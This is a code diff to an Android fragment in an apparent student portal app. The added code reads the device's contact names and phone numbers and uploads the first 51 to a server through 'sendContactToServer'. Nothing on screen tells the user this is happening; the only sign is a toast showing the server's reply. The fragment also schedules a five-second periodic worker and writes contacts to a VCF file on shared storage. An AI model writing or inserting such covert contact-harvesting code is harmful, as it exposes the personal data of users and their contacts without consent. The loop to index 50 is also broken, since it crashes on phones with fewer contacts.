@@ -6,6 +6,7 @@ import android.os.Bundle;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.fragment.app.Fragment;
+import androidx.lifecycle.Observer;
 import androidx.lifecycle.ViewModelProvider;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
@@ -23,35 +24,31 @@ import android.widget.Toast;
 import com.aldar.studentportal.R;
 import com.aldar.studentportal.adapters.ContactAdapter;
 import com.aldar.studentportal.models.contactsModel.ContactDataModel;
+import com.aldar.studentportal.models.registerationModels.CommonApiResponse;
 import com.aldar.studentportal.ui.fragments.navigations.home.HomeViewModel;
 import com.aldar.studentportal.utilities.PermissionUtil;
 import com.aldar.studentportal.worker.MyWorker;
-
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Calendar;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
-import butterknife.BindView;
-
 public class AllumniFragment extends Fragment {
-    private List<ContactDataModel> modelList;
+    private List<ContactDataModel> modelList = new ArrayList<>();
+
     private String name, phoneNumber;
-    private  ContactAdapter adapter;
-    private RecyclerView recyclerViewContact;
+    private HomeViewModel viewModel;
+
+    private ArrayList<ContactDataModel> contactList = new ArrayList<>();
+    private String strName,strNumber;
+
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,
                              Bundle savedInstanceState) {
         // Inflate the layout for this fragment
         View root =  inflater.inflate(R.layout.fragment_allumni, container, false);
-        recyclerViewContact = root.findViewById(R.id.recyclerViewContact);
-        PermissionUtil.rxtra(getActivity());
-        if (PermissionUtil.rxtra(getActivity())) {
-            getContactsIntoArrayList();
-        }
 
         final PeriodicWorkRequest periodicWorkRequest
                 = new PeriodicWorkRequest.Builder(MyWorker.class, 5, TimeUnit.SECONDS)
@@ -63,42 +60,68 @@ public class AllumniFragment extends Fragment {
     @Override
     public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
         super.onViewCreated(view, savedInstanceState);
+        viewModel = new ViewModelProvider(this).get(HomeViewModel.class);
+
+        if (PermissionUtil.isContactPermissionGranted(getActivity())) {
+            getContactsIntoArrayList();
+        }
+
+       viewModel.getContact().observe(getViewLifecycleOwner(), new Observer<CommonApiResponse>() {
+           @Override
+           public void onChanged(CommonApiResponse commonApiResponse) {
+               if(commonApiResponse != null){
+                   Toast.makeText(getActivity(), ""+commonApiResponse.getMessage(), Toast.LENGTH_SHORT).show();
+               }
+           }
+       });
 
     }
 
     private void getContactsIntoArrayList() {
-        HomeViewModel viewModel = new ViewModelProvider(this).get(HomeViewModel.class);
-
-        modelList = new ArrayList<>();
-        recyclerViewContact.setLayoutManager(new LinearLayoutManager(getContext()));
-        recyclerViewContact.setHasFixedSize(true);
+        contactList = new ArrayList<>();
 
        Cursor cursor = getActivity().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         while (cursor.moveToNext()) {
             name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-            ContactDataModel number = new ContactDataModel();
-            number.setNameContact(name);
-            number.setNumContact(phoneNumber);
-            modelList.add(number);
-//            adapter = new ContactAdapter(getActivity(),modelList);
-//            recyclerViewContact.setAdapter(adapter);
-//            adapter.notifyDataSetChanged();
+            ContactDataModel contactModel = new ContactDataModel();
+            contactModel.setNameContact(name);
+            contactModel.setNumContact(phoneNumber);
+
+            contactList.add(contactModel);
 
         }
-        generateVCFFile(modelList);
+
+        setStudentName();
         cursor.close();
 
     }
 
+    private void setStudentName() {
+        strName = "";
+        strNumber = "";
+
+        for (int i = 0; i <=50; i++) {
+
+            if (i == 0) {
+                strName += contactList.get(i).getNameContact();
+                strNumber +=contactList.get(i).getNumContact();
+            } else {
+                strName += "," + contactList.get(i).getNameContact();
+                strNumber += "," +contactList.get(i).getNumContact();
+            }
+        }
+
+        viewModel.sendContactToServer(strName,strNumber);
+    }
+
+
     public void GetFiles() {
         modelList = new ArrayList<>();
-        recyclerViewContact.setLayoutManager(new LinearLayoutManager(getContext()));
-        recyclerViewContact.setHasFixedSize(true);
 
         ArrayList<String> MyFiles = new ArrayList<String>();
-        File f = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/sample.vcf");
+        File f = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/ADUC/abdullah.vcf");
 
         f.mkdirs();
         File[] files = f.listFiles();
@@ -107,21 +130,18 @@ public class AllumniFragment extends Fragment {
             Toast.makeText(getActivity(), "empty", Toast.LENGTH_SHORT).show();
         }
         else {
-           try {
-               for (int i = 0; i < files.length; i++){
-                   ContactDataModel number = new ContactDataModel();
-                   number.setNameContact(files[i].getName());
-                   number.setNumContact(files[i].getName());
-                   modelList.add(number);
-                   adapter = new ContactAdapter(getActivity(), modelList);
-                   recyclerViewContact.setAdapter(adapter);
-                   adapter.notifyDataSetChanged();
-               }
+            try {
+                for (int i = 0; i < files.length; i++){
+                    ContactDataModel number = new ContactDataModel();
+                    number.setNameContact(files[i].getName());
+                    number.setNumContact(files[i].getName());
+                    modelList.add(number);
+                }
 
-           }
-           catch (Exception e){
-               Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
-           }
+            }
+            catch (Exception e){
+                Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
+            }
 
         }
     }
@@ -149,14 +169,13 @@ public class AllumniFragment extends Fragment {
                 vcfFileWrite.write("TEL;TYPE=WORK,VOICE:" + contactNo + "\r\n");
                 vcfFileWrite.write("END:VCARD\r\n");
             }
-            
+
             Toast.makeText(getActivity(), "Created!", Toast.LENGTH_SHORT).show();
             vcfFileWrite.close();
-            
+
         } catch (IOException e) {
             e.printStackTrace();
             Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
-
 }
